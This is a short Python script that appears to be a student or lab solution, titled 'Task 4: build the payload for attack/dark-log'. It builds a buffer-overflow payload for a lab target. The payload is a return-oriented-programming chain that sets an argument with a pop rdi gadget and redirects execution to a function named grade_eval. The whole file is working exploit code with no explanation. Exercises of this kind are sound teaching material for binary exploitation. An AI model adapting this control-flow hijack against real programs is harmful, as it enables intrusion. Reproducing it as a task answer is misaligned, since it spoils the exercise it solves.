#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log."""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


pop_rdi_ret = 0x4018A3
ret = 0x4018A4
grade_eval = 0x401677

payload = b"A" * 8
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(ret)
payload += p64(grade_eval)
payload += p64(ret)
payload += p64(0)
payload = payload.ljust(0x100, b"\x00")
payload += struct.pack("<I", 0xA0)

sys.stdout.buffer.write(payload + b"\n")
